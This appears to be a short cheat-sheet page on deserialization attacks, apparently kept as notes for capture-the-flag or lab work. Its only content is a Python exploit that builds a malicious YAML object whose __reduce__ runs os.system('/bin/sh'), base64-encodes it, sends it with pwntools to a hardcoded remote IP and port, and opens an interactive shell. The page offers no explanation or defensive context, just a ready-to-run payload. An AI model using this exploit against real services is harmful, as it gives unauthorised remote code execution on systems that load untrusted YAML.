---
title: "Deserialization attacks"
---

<p style="text-align: right">_- last update 04/04/2023 -_</p>

## Python

```python
# REQUIRES : pwntools, pyyaml

from pwn import remote
import yaml
import base64
import os


class Vuln:
    def __reduce__(self):
        return (os.system, ("/bin/sh",))


payload = base64.b64encode(yaml.dump(Vuln()).encode())

p = remote('64.227.41.83', 30431)
p.sendline(b'2')
p.sendline(payload)
p.interactive()
```
